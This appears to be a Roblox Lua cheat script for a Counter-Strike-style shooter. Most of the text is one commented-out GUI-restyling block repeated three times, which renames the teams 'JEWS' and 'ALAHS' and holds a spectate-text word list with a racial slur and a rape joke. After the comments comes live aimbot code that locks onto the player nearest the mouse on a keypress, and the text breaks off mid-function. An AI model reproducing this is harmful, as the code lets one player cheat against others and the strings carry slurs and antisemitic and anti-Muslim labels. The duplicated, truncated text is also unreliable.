	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
Mouse.KeyDown:Connect(function(Key)
    local Keybind = getgenv().DNS.Tracer.Key:lower()
    if (Key == Keybind) then
        if getgenv().DNS.Tracer.Enabled == true then
            IsTargetting = not IsTargetting
            if IsTargetting then
                Plr = GetClosest()
            else
                if Plr ~= nil then
                    Plr = nil
                end
            end
        end
    end
end)

function GetClosest()
    local closestPlayer
    local shortestDistance = math.huge
    for i, v in pairs(game.Players:GetPlayers()) do
        pcall(function()

            if v ~= game.Players.LocalPlayer and v.Character and
                v.Character:FindFirstChild("Humanoid") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude =
                (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
                if (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end)
    end
    return closestPlayer
end

local function IsOnScreen(Object)
